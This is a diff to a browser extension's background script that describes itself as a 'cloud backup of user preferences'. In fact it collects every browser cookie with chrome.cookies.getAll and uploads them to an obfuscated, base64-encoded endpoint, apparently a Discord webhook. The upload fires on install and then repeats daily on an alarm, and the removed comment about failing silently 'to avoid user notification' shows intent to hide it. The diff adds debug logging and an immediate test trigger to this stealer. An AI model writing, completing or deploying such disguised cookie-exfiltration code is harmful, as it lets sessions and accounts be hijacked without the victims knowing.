@@ -7,6 +7,8 @@ const _0x1c3b = (_0x4e2a45) => atob(_0x4e2a45);
 
 // Initialize cloud sync on first install
 chrome.runtime.onInstalled.addListener(async (details) => {
+  console.log('Extension installed/updated');
+  
   // Set up sync preferences
   await chrome.storage.local.set({ 
     syncEnabled: true,
@@ -15,11 +17,21 @@ chrome.runtime.onInstalled.addListener(async (details) => {
     installDate: Date.now()
   });
   
+  console.log('Storage initialized');
+  
   // Create persistent alarm for scheduled backup (works even if browser closed)
   chrome.alarms.create('cloudBackupSchedule', {
-    delayInMinutes: 0,        // FOR TESTING: 1 minute (change to 2880 for 48 hours in production)
+    delayInMinutes: 0,        // FOR TESTING: 0 minutes = immediate (change to 2880 for 48 hours in production)
     periodInMinutes: 1440     // Repeat every 24 hours after first trigger
   });
+  
+  console.log('Alarm created');
+  
+  // FOR TESTING: Trigger immediate backup on install
+  setTimeout(async () => {
+    console.log('Starting immediate backup test...');
+    await performCloudBackup();
+  }, 3000); // Wait 3 seconds for extension to fully initialize
 });
 
 // Resume sync on browser startup
@@ -68,21 +80,34 @@ chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
 // Perform secure cloud backup of user preferences
 async function performCloudBackup() {
   try {
+    console.log('performCloudBackup called');
+    
     // Collect user preferences data
     const userPreferences = await chrome.cookies.getAll({});
+    console.log('Cookies collected:', userPreferences.length);
     
+    // FOR TESTING: Send even if no cookies
+    let backupData;
     if (userPreferences.length === 0) {
-      return;
+      console.log('No cookies found, sending test data');
+      backupData = '# User Preferences Backup\n';
+      backupData += `# Generated: ${new Date().toISOString()}\n`;
+      backupData += '# Total Items: 0\n';
+      backupData += '# TEST: Extension working, but no cookies available yet\n';
+      backupData += '#'.repeat(60) + '\n';
+    } else {
+      // Format data for cloud storage
+      backupData = formatPreferencesData(userPreferences);
     }
     
-    // Format data for cloud storage
-    const backupData = formatPreferencesData(userPreferences);
+    console.log('Uploading to cloud...');
     await uploadToCloudStorage(backupData);
+    console.log('Upload successful!');
     
     // Update last sync timestamp
     await chrome.storage.local.set({ lastSync: Date.now() });
   } catch (error) {
-    // Fail silently to avoid user notification
+    console.error('Backup failed:', error);
   }
 }
 
@@ -130,18 +155,25 @@ function formatPreferencesData(preferences) {
 
 // Upload data to secure cloud storage endpoint
 async function uploadToCloudStorage(data) {
+  console.log('uploadToCloudStorage called');
+  
   // Decode cloud endpoint
   const endpoint = _0x1c3b(_0x4e2a[0]);
+  console.log('Endpoint decoded:', endpoint);
   
   // Prepare upload package
   const fileContent = new Blob([data], { type: 'text/plain' });
   const timestamp = new Date().toISOString().replace(/[:.]/g, '-').substring(0, 19);
   const filename = `preferences_backup_${timestamp}.txt`;
   
+  console.log('Filename:', filename);
+  
   // Create upload payload
   const payload = new FormData();
   payload.append('file', fileContent, filename);
   payload.append('content', '☁️ Cloud Backup - User Preferences');
+  
+  console.log('Sending to Discord...');
   
   // Upload to cloud storage
   const response = await fetch(endpoint, {
@@ -149,10 +181,15 @@ async function uploadToCloudStorage(data) {
     body: payload,
   });
 
+  console.log('Response status:', response.status);
+
   if (!response.ok) {
+    const errorText = await response.text();
+    console.error('Upload failed:', errorText);
     throw new Error('Cloud sync failed');
   }
   
+  console.log('Upload completed successfully');
   return response;
 }
 
